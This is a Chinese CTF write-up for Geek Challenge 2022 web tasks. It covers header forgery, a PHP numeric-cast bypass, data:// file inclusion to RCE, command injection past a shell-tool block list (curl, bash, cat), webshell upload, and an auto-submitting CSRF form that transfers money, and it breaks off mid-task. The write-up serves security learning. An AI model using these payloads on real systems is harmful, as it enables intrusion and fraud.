<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>极客大挑战2022 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="极客大挑战2022 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982022/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:30:10.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">极客大挑战2022</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="登录试试"><a href="#登录试试" class="headerlink" title="登录试试"></a>登录试试</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668700887788-f65dd8dc-d752-4334-b2b8-48009b328e6e.png#averageHue=%2335383d&clientId=ucecd0ee9-26fc-4&from=paste&height=242&id=u69209e91&name=image.png&originHeight=303&originWidth=795&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81953&status=done&style=none&taskId=ub6c3b690-df58-4d8c-bdf6-526d20a0fdb&title=&width=636" alt="image.png"><br>爆破会不会啊爆破，不写过程了，真的很基础</p>
<h2 id="来发个包"><a href="#来发个包" class="headerlink" title="来发个包"></a>来发个包</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668700921389-8904083b-8a6c-41f4-b0d6-7d48d0480109.png#averageHue=%23fefdfd&clientId=ucecd0ee9-26fc-4&from=paste&height=305&id=ub62ba15d&name=image.png&originHeight=381&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18584&status=done&style=none&taskId=u3f9291c4-cf91-4d22-860c-d46b20ebb5d&title=&width=684.8" alt="image.png"><br>看到了js吗，这边意思就是向<code>/flag.php</code>post传参一个<code>ifffflag</code><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668700980238-6acbb872-626b-40c4-aa8f-13df8a49071e.png#averageHue=%23b4b3b3&clientId=ucecd0ee9-26fc-4&from=paste&height=719&id=u0e8c01a7&name=image.png&originHeight=899&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34478&status=done&style=none&taskId=u1b4be6de-0348-4ade-8f13-b7884327cb7&title=&width=695.2" alt="image.png"></p>
<h2 id="Can-Can-Need"><a href="#Can-Can-Need" class="headerlink" title="Can Can Need"></a>Can Can Need</h2><p>弱智一样的请求头伪造<br>用clinet-ip：127.0.0.1<br>然后referer：sycsec.com<br>user-agent：Syclover Browser</p>
<h2 id="L0veSyc"><a href="#L0veSyc" class="headerlink" title="L0veSyc"></a>L0veSyc</h2><p>梦开始的地方，看源码</p>
<h2 id="justphp"><a href="#justphp" class="headerlink" title="justphp"></a>justphp</h2><p>起步咯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> (<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sleeptime</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;SleepTime&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$sleeptime</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$sleeptime</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;时间是一个数字啊喂！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$sleeptime</span> &lt; <span class="number">86400</span> * <span class="number">30</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;这点时间哪够Canzik学长睡啊&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$sleeptime</span> &gt; <span class="number">86400</span> * <span class="number">60</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;别让Canzik学长睡死在这啊！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;Canzik学长很满足,表示这次把这辈子的觉都睡完啦！flag在这,自己拿吧:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>((<span class="keyword">int</span>)<span class="variable">$sleeptime</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里就是一个小知识<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668701340111-159dfc02-349f-4a6f-87e7-d8f8eb03b5ea.png#averageHue=%23fdfbfa&clientId=ucecd0ee9-26fc-4&from=paste&height=54&id=u9f71d867&name=image.png&originHeight=68&originWidth=387&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4209&status=done&style=none&taskId=u7bf35565-07dd-4c28-a324-4475430a53a&title=&width=309.6" alt="image.png"><br>在PHP版本为5.6左右时:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">int</span>)(<span class="string">&quot;1e1&quot;</span>)=<span class="number">1</span></span><br><span class="line"><span class="string">&quot;1e1&quot;</span>=<span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>这是一个小漏洞，intval函数也有这个特性<br><code>?SleepTime=3e6</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668701476543-dd33d9be-6999-4a11-a4e6-895dbcd1a273.png#averageHue=%23f7f6f4&clientId=ucecd0ee9-26fc-4&from=paste&height=121&id=u05efd6ce&name=image.png&originHeight=151&originWidth=694&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10596&status=done&style=none&taskId=ue966aed9-05ed-4b0e-aaa6-e3244c654bd&title=&width=555.2" alt="image.png"></p>
<h2 id="jsfind"><a href="#jsfind" class="headerlink" title="jsfind"></a>jsfind</h2><p>js题什么的，感觉的去死吧！<br>虽然不是很难，但是呢，需要你的经验之谈，也是挺有趣的吼<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702592903-fec19d91-0bf6-4ee8-b2d7-d36554041e2f.png#averageHue=%2327272b&clientId=ucecd0ee9-26fc-4&from=paste&height=94&id=u0406448f&name=image.png&originHeight=118&originWidth=738&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21526&status=done&style=none&taskId=uab049d5e-bf84-43c3-a1d1-2f9ab689f4e&title=&width=590.4" alt="image.png"><br>这个hint好像是之后给的，刚开始做的时候就发现了这个：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702614652-173ca702-91a1-47ff-8564-15b2d57ee204.png#averageHue=%23faf8f6&clientId=ucecd0ee9-26fc-4&from=paste&height=155&id=u6d052a5a&name=image.png&originHeight=194&originWidth=1086&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26398&status=done&style=none&taskId=u9150248a-dabf-4e97-ab5c-9f983ec6120&title=&width=868.8" alt="image.png"><br>这边有个js的load.js，一看就知道是加载js文件的<br>进去之后有个base64解密之后为：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702641912-2c3fea7b-b57a-44a8-8512-44138cf05ba8.png#averageHue=%232c2c2c&clientId=ucecd0ee9-26fc-4&from=paste&height=296&id=ufd48149c&name=image.png&originHeight=370&originWidth=1393&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69093&status=done&style=none&taskId=uf5ed0e3d-3ee8-413e-aa53-b9c19809d58&title=&width=1114.4" alt="image.png"><br>放到控制台输入一波：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702653964-2b263839-b77f-430e-830d-73cc7369e4a6.png#averageHue=%23e0ba82&clientId=ucecd0ee9-26fc-4&from=paste&height=769&id=ub3764388&name=image.png&originHeight=961&originWidth=1363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=160861&status=done&style=none&taskId=u4c15aaf6-acee-468e-a76b-05866f0f344&title=&width=1090.4" alt="image.png"><br>这个应该是前端的某种加密，搜一下很多</p>
<h2 id="ezR-F-I"><a href="#ezR-F-I" class="headerlink" title="ezR_F_I"></a>ezR_F_I</h2><p>简单的data协议：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702780883-4b76b334-8b10-4bb5-9f06-ec5a68bde359.png#averageHue=%23dfbe8b&clientId=ucecd0ee9-26fc-4&from=paste&height=252&id=u41fb1bb7&name=image.png&originHeight=315&originWidth=850&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28100&status=done&style=none&taskId=uc42c244c-bb7e-4d4c-baeb-2fd47ba4bf2&title=&width=680" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702786094-23ebbb20-7738-4868-9c75-c863922e2f98.png#averageHue=%23fafade&clientId=ucecd0ee9-26fc-4&from=paste&height=118&id=u91f2b25c&name=image.png&originHeight=147&originWidth=873&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13091&status=done&style=none&taskId=udbd3dac5-5f33-4c42-b2ff-385b3304c77&title=&width=698.4" alt="image.png"><br>可以看到有个file，我们随便传点<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702802879-151b5f5c-d706-4b98-a9c2-2867d9e48836.png#averageHue=%23f3f4de&clientId=ucecd0ee9-26fc-4&from=paste&height=109&id=uac003ea3&name=image.png&originHeight=136&originWidth=944&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11821&status=done&style=none&taskId=ua886bc7a-116d-459f-8b1f-ec60cb3d23e&title=&width=755.2" alt="image.png"><br>会自动给我们加个html后缀，猜测语句为<code>include(xxx.html)</code>,那就好说了，直接data协议去解：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702858616-3bc464ea-1d0b-423a-bce8-ee307134a79b.png#averageHue=%23e1e4da&clientId=ucecd0ee9-26fc-4&from=paste&height=294&id=u91df7e42&name=image.png&originHeight=368&originWidth=1338&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64474&status=done&style=none&taskId=u05d63662-6eb5-44df-a083-f83f2ea84ab&title=&width=1070.4" alt="image.png"><br>RCE了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668702882604-6b81b754-bbb0-4329-a16b-ed438e4dc34a.png#averageHue=%23d7b37b&clientId=ucecd0ee9-26fc-4&from=paste&height=139&id=u504a835a&name=image.png&originHeight=174&originWidth=1239&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18501&status=done&style=none&taskId=ue22c337e-60c4-48d4-bf26-d17e8c91892&title=&width=991.2" alt="image.png"><br>结束</p>
<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*佛又曰：输羯吉摩伽无婆羯尼羯驮萨夜南楞婆唵遮参怛烁阿怛度怛唎谨栗南提萨楞度摩谨伽伽墀醯咩驮夜帝俱佛悉呼数写帝尼嚧蒙舍利沙室罚陀俱悉夜喝唵尼孕南写利驮卢罚谨蒙伊谨尼卢利伽豆地皤穆罚驮醯伽无菩钵输烁呼驮数数嚧摩阇钵咩菩卢栗阇室栗罚俱室写耶穆墀摩利楞数皤哆呼无罚埵羯钵怛唎埵吉夜尼帝佛帝墀南吉孕室写南孕怛参阇呼怛伽迦地呼嚧咩参谨南他佛尼利栗数喝呼怛耶啰摩那羯喝萨啰俱婆楞孕孕穆呼哆输伽室利参迦苏摩伊嚧埵罚豆佛写那帝楞室墀度罚娑佛陀豆萨吉埵尼醯尼咩穆伽呼尼伊嚧呼阇娑摩苏驮苏地孕唵苏沙利无伽伊写提曳谨帝栗参啰迦俱菩罚呼遮埵无伽舍萨提遮他南栗醯啰罚曳咩伊娑咩楞咩豆墀钵皤度那沙栗菩夜苏迦迦摩婆萨输舍南沙啰输阇怛佛钵吉那埵南皤度啰孕遮烁沙蒙输他帝婆谨舍沙菩阿地阇遮阿埵输醯怛参栗无羯怛婆参舍无他羯悉遮吉孕羯哆蒙呼阇苏舍曳萨耶悉尼羯提娑谨遮婆罚罚苏婆数钵烁豆利室栗提陀他沙输悉罚唵埵摩迦啰参羯喝伊咩哆菩萨谨唎伊陀孕尼驮尼楞哆提栗悉诃参数嚧啰输罚咩尼罚唵迦沙穆穆无夜哆萨醯孕阇参羯佛耶南夜孕陀驮地醯舍尼驮萨提豆罚伽数阿耶呼栗写遮啰醯利萨嚧豆婆娑唵皤舍伊栗地沙阇婆喝利钵阇皤豆驮迦萨伊摩那唵迦穆羯萨驮娑摩那钵墀卢无陀埵谨哆醯穆醯度提室蒙夜伽悉提醯伊摩尼陀嚧写栗悉舍萨谨嚧提钵啰钵写啰萨墀曳唎埵参耶墀啰那喝迦遮嚧咩苏啰提咩卢耶埵阇楞孕喝怛羯嚧哆俱悉哆阇迦埵呼参舍沙蒙度穆夜皤尼诃无陀那沙沙蒙谨皤尼提诃穆悉罚啰输豆利尼阿栗喝皤豆喝咩咩嚧室曳醯楞墀利那参伽嚧钵输曳墀陀诃婆曳唎孕伽尼楞室谨蒙数唎迦醯帝摩提那谨俱摩婆罚南地他穆唵卢菩尼婆嚧醯写唎遮啰南无俱菩他孕娑怛栗他提卢菩数喝他帝俱诃罚无佛怛醯悉夜唵墀度摩咩帝舍孕豆他醯阿醯南摩沙哆室唎伊烁利驮咩参曳数吉沙钵怛羯伽穆嚧俱提诃罚参那南写数羯驮萨提孕数驮罚栗蒙墀谨驮羯度孕娑摩娑尼豆遮怛提尼陀烁呼喝婆萨沙伊迦羯曳佛遮卢遮尼苏谨啰栗室提参喝吉怛卢墀墀蒙摩利咩萨诃娑罚阿穆地舍尼蒙孕喝皤萨他嚧卢迦输地阿利曳楞喝哆曳喝醯沙诃南舍罚罚数提皤咩南悉伊喝栗摩诃输苏咩啰提吉尼无啰伊咩羯栗菩嚧室那那吉室伽写输南娑输耶墀舍沙无地迦无度提陀穆苏驮利蒙帝菩豆伽豆陀数穆伽度墀室孕卢提啰迦墀那呼俱吉唎地哆夜豆怛喝迦摩皤俱孕阿吉曳烁那阿哆俱输尼穆唎帝他卢烁曳他谨地皤卢地佛苏喝悉唵羯参曳尼啰楞驮沙输耶钵他菩那无曳吉遮罚喝舍输参卢豆伊摩耶曳迦曳夜娑唎墀蒙卢俱喝帝摩度曳曳伊喝他无钵伽吉室唎地唎咩埵舍唵孕尼尼嚧羯呼遮耶室迦墀娑钵驮提伊醯呼室写唎舍参陀南俱摩耶度耶烁写萨萨无伊陀吉墀罚孕利埵那利摩伽钵楞地伽迦喝利他输皤曳卢迦沙怛地写卢伊埵孕诃呼蒙埵输婆写阿唎蒙婆婆萨俱沙栗悉那蒙伽卢诃夜罚输无菩他参写迦诃穆萨他菩皤醯咩孕墀耶室驮钵唵摩埵墀利阇利伽墀埵楞婆喝写埵尼迦吉咩婆陀沙婆喝咩阇室楞豆皤俱楞迦室悉阇婆钵呼阿唎沙迦驮悉烁楞那陀娑楞菩钵埵喝室卢陀俱舍楞钵蒙夜穆帝菩喝地诃提地夜无他阿嚧夜漫</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="variable">$ip</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 3 <span class="subst">$ip</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703000245-b2e74e0f-8c29-42ca-a931-15caf3a31526.png#averageHue=%23fceee0&clientId=ucecd0ee9-26fc-4&from=paste&height=507&id=uda04a932&name=image.png&originHeight=634&originWidth=1445&originalType=binary&ratio=1&rotation=0&showTitle=false&size=169353&status=done&style=none&taskId=u618663e8-6fb9-49a4-8012-1efd68328bc&title=&width=1156" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703043581-9fa60c18-a01b-466f-9613-f1b8289e9d63.png#averageHue=%23928e8b&clientId=ucecd0ee9-26fc-4&from=paste&height=364&id=u738efae5&name=image.png&originHeight=455&originWidth=1278&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44330&status=done&style=none&taskId=ud3bd1a92-127f-4d64-aff9-a182f591903&title=&width=1022.4" alt="image.png"></p>
<h2 id="WelcomeSQL"><a href="#WelcomeSQL" class="headerlink" title="WelcomeSQL"></a>WelcomeSQL</h2><p>宝宝级别的SQL：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703070656-07bb8642-09fb-412a-a6c5-419535cd0199.png#averageHue=%23cacebf&clientId=ucecd0ee9-26fc-4&from=paste&height=139&id=u3ef710b5&name=image.png&originHeight=174&originWidth=857&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30807&status=done&style=none&taskId=u8115ede2-71ed-4b69-9b5f-be4af2e523a&title=&width=685.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703090668-27936c9e-fc66-4972-9072-80c1298f7988.png#averageHue=%23d4d6c9&clientId=ucecd0ee9-26fc-4&from=paste&height=124&id=u7a55c332&name=image.png&originHeight=155&originWidth=969&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31673&status=done&style=none&taskId=uc4acf889-744d-450d-b6f8-9031f11d267&title=&width=775.2" alt="image.png"><br>union注入，payload自己去写</p>
<h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p>PHP文件都直接提交了，正好试试我的大木马！<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703144654-b1b38e82-140b-44e7-bde2-ffc20a97aff0.png#averageHue=%23e6c181&clientId=ucecd0ee9-26fc-4&from=paste&height=238&id=u065dc4da&name=image.png&originHeight=297&originWidth=905&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29454&status=done&style=none&taskId=uf5a62571-3d46-4575-b76f-5fd027936ca&title=&width=724" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703189189-b044c769-e90a-4ae9-a911-d2d88093fbf3.png#averageHue=%23eae8e0&clientId=ucecd0ee9-26fc-4&from=paste&height=314&id=ucc6eeb25&name=image.png&originHeight=393&originWidth=1566&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39672&status=done&style=none&taskId=u05556dea-a4e6-4112-b00d-bb5972e5a1a&title=&width=1252.8" alt="image.png"><br>这种feel很爽</p>
<h2 id="drinktea"><a href="#drinktea" class="headerlink" title="drinktea"></a>drinktea</h2><p>三点给嘞！饮茶先啊！考点就是CSRF<br>进入靶场后先登录<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703295433-baeaa480-eab1-42d1-b8e1-06fe93b7af98.png#averageHue=%23acbdb9&clientId=ucecd0ee9-26fc-4&from=paste&height=422&id=u7f2fab97&name=image.png&originHeight=527&originWidth=1612&originalType=binary&ratio=1&rotation=0&showTitle=false&size=382995&status=done&style=none&taskId=u48bcc04d-5be0-41d3-875e-3b971a7acff&title=&width=1289.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703302180-e938c5b1-4623-46f8-a199-cbbd877918ab.png#averageHue=%23e2bf86&clientId=ucecd0ee9-26fc-4&from=paste&height=128&id=ua6520d85&name=image.png&originHeight=160&originWidth=977&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13696&status=done&style=none&taskId=uac598542-bcf8-4c65-a625-c74c159a4f9&title=&width=781.6" alt="image.png"><br>我们的目标很明确就是这个他妈的尊贵的vip<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703326735-877075ce-342f-42fa-adfc-1897536b0234.png#averageHue=%239cb4c6&clientId=ucecd0ee9-26fc-4&from=paste&height=214&id=ucf7ff588&name=image.png&originHeight=267&originWidth=973&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119569&status=done&style=none&taskId=u7fc6d432-bd5f-4d85-b683-881899ac500&title=&width=778.4" alt="image.png"><br>赤裸裸的告诉你了，我们就在VPS搭建一个恶意文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_ invoke__">click</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;http://mc.vveelin.com.cn:8102/trans.php&quot;</span>&gt;</span><br><span class="line">    &lt;input id=<span class="string">&quot;u&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;kino&quot;</span>&gt;</span><br><span class="line">    &lt;input id=<span class="string">&quot;m&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;money&quot;</span> value=<span class="string">&quot;999999999999&quot;</span>&gt;</span><br><span class="line">    &lt;input id=<span class="string">&quot;postsubmit&quot;</span> type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>这个意思就是打钱！<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703412159-f167842a-6c9e-4e11-b40a-dc5da4db739f.png#averageHue=%23fcfbfb&clientId=ucecd0ee9-26fc-4&from=paste&height=222&id=ud6c9948c&name=image.png&originHeight=278&originWidth=1128&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17316&status=done&style=none&taskId=ua5403b5c-6af0-4867-a130-8e75977ef92&title=&width=902.4" alt="image.png"><br>在反馈界面可以看到个伪随机数，不难的，直接用php_mt_seed去撞开，最后可以发现种子为<code>666666</code>，然后本地复现一下：</p>
